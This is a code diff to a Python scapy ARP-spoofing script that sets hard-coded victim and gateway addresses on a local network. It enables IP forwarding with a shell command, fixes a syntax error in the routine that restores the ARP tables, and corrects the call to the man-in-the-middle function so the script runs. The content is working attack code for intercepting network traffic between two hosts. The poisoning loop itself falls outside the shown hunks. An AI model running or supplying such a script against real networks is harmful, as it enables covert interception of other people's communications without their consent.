@@ -6,8 +6,10 @@ import os
 import time
 
 interface = 'eth0'
-victimIP = ''
-gateIP = ''
+# Victim in this case is the initiator
+victimIP = '192.168.1.124'
+# Gateway in this case is the target
+gateIP = '192.168.1.127'
 
 print "\n [*] Enabling IP forwarding... \n"
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
@@ -26,7 +28,7 @@ def reARP():
     print "\n[*] Restoring Targets..."
     victimMAC = get_mac(victimIP)
     gateMAC = get_mac(gateIP)
-    send(ARP(op = 2, pdst = gateIP, psrc = victim IP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
+    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
     send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
     print "[*] Disabling IP Forwarding..."
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
@@ -63,4 +65,5 @@ def man_in_the_middle():
         except KeyboardInterrupt:
             reARP()
             break
-mitm()
+
+man_in_the_middle()
